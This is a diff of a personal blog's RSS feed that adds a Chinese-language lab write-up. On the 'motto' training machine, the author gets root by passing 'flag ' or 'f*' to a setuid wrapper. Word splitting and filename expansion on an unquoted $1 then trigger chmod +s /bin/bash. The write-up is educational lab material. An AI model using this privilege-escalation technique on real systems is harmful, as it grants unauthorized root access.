@@ -1,5 +1,108 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>MJ</title><link>https://faabbi.github.io</link><description>嫉妒能让你前进，但也能让你陷入深渊。</description><copyright>MJ</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/99706997?v=4</url><title>avatar</title><link>https://faabbi.github.io</link></image><lastBuildDate>Thu, 20 Nov 2025 10:36:45 +0000</lastBuildDate><managingEditor>MJ</managingEditor><ttl>60</ttl><webMaster>MJ</webMaster><item><title>Motto</title><link>https://faabbi.github.io/post/Motto.html</link><description>**==这个靶机打下来，给我的感觉非常好。</description><guid isPermaLink="true">https://faabbi.github.io/post/Motto.html</guid><pubDate>Wed, 19 Nov 2025 14:03:45 +0000</pubDate></item><item><title>sd提权</title><link>https://faabbi.github.io/post/sd-ti-quan.html</link><description>
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>MJ</title><link>https://faabbi.github.io</link><description>嫉妒能让你前进，但也能让你陷入深渊。</description><copyright>MJ</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/99706997?v=4</url><title>avatar</title><link>https://faabbi.github.io</link></image><lastBuildDate>Thu, 20 Nov 2025 10:39:42 +0000</lastBuildDate><managingEditor>MJ</managingEditor><ttl>60</ttl><webMaster>MJ</webMaster><item><title>bash字分割 文件名扩展</title><link>https://faabbi.github.io/post/bash-zi-fen-ge-%20-wen-jian-ming-kuo-zhan.html</link><description>接到反弹shell后，在opt下发现具有s位的程序，并且在家目录发现备份文件
+```
+www-data@motto:/opt$ ls -al
+total 32
+drwxr-xr-x  2 root root  4096 Jul 31 08:27 .
+drwxr-xr-x 19 root root  4096 Jul 31 03:46 ..
+-r-xr-----  1 root root  1709 Jul 31 02:45 new.sh
+-rwsr-sr-x  1 root root 16864 Jul 31 08:27 run_newsh
+
+www-data@motto:/home/redbean/.backup$ ls -la
+total 16
+drwxr-xr-x 2 root    root    4096 Jul 31 08:27 .
+drwxr-xr-x 3 redbean redbean 4096 Jul 31 08:29 ..
+-r--r--r-- 1 root    root    1709 Jul 31 02:46 new.sh
+-rw-r--r-- 1 root    root     509 Jul 31 08:27 run_newsh.c
+```
+查看程序逻辑可知，elf执行接受第一个参数，然后以root权限运行sh文件，并且传递参数
+```
+[ '$1' = 'flag' ] &amp;&amp; exit 2
+[ $1 = 'flag' ] &amp;&amp; chmod +s /bin/bash
+```
+关键在于这两行
+
+**1.字分割**(与bash版本有关)
+
+**==$1会进行字分割以及文件名扩展，'$1'则不会
+例如，如果我给定$1为flag （注意flag后有空格），则'$1'则为flag （空格），从而判等不成立，而$1则会因为字分割，从而导致$1=flag，$2=空格，从而判等为bash加上s位
+
+```
+www-data@motto:/opt$ ./run_newsh 'flag '
+
+▓▒░ Loading system diagnostics ░▒▓
+
+[INFO] Initializing environment checks:
+ ● Module A status: OK (ver 2.9.432)
+ ● Module B status: OK (ver 4.9.331)
+ ● Module C status: OK (ver 3.2.375)
+Random seed value: 10307
+[INFO] Evaluating input parameters...
+[INFO] Running diagnostic sequence:
+ → Executing test 1 of 3
+ → Executing test 2 of 3
+ → Executing test 3 of 3
+
+Waiting period: 6 seconds
+&gt;&gt; Waiting T-6 seconds...
+&gt;&gt; Countdown: 5
+&gt;&gt; Waiting T-4 seconds...
+&gt;&gt; Countdown: 3
+&gt;&gt; Waiting T-2 seconds...
+&gt;&gt; Countdown: 1
+&gt;&gt; Waiting T-0 seconds...
+Diagnostics complete.
+Thank you for using the system monitor.
+[STATS] Summary Report:
+    Processes checked: 48
+/opt/new.sh: line 60: bc: command not found
+/opt/new.sh: line 60: echo: write error: Broken pipe
+    CPU load average: 
+    Uptime (hours): 72
+www-data@motto:/opt$ ls -al /bin/bash
+-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
+```
+可以看到bash加上了s位
+
+**2.文件名扩展**
+
+传入参数星号或问号作为通配符,从而'$1'判等不成立，而对于$1，则会在视作星号或问号为通配符在本级目录下查找文件，从而成功判等
+
+```
+www-data@motto:/tmp$ /opt/run_newsh 'f*'
+
+▓▒░ Loading system diagnostics ░▒▓
+
+[INFO] Initializing environment checks:
+ ● Module A status: OK (ver 3.8.498)
+ ● Module B status: OK (ver 2.11.255)
+ ● Module C status: OK (ver 4.19.266)
+Random seed value: 2185
+[INFO] Evaluating input parameters...
+[INFO] Running diagnostic sequence:
+ → Executing test 1 of 3
+ → Executing test 2 of 3
+ → Executing test 3 of 3
+
+Waiting period: 3 seconds
+&gt;&gt; Countdown: 3
+&gt;&gt; Waiting T-2 seconds...
+&gt;&gt; Countdown: 1
+&gt;&gt; Waiting T-0 seconds...
+System stable.
+Thank you for using the system monitor.
+[STATS] Summary Report:
+    Processes checked: 31
+/opt/new.sh: line 60: bc: command not found
+/opt/new.sh: line 60: echo: write error: Broken pipe
+    CPU load average: 
+    Uptime (hours): 56
+www-data@motto:/tmp$ ls -al /bin/bash
+-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
+
+```
+可以看到bash也被加上s位，进而即可提权
+。</description><guid isPermaLink="true">https://faabbi.github.io/post/bash-zi-fen-ge-%20-wen-jian-ming-kuo-zhan.html</guid><pubDate>Thu, 20 Nov 2025 10:39:07 +0000</pubDate></item><item><title>Motto</title><link>https://faabbi.github.io/post/Motto.html</link><description>**==这个靶机打下来，给我的感觉非常好。</description><guid isPermaLink="true">https://faabbi.github.io/post/Motto.html</guid><pubDate>Wed, 19 Nov 2025 14:03:45 +0000</pubDate></item><item><title>sd提权</title><link>https://faabbi.github.io/post/sd-ti-quan.html</link><description>
 2025年11月13日
 
 
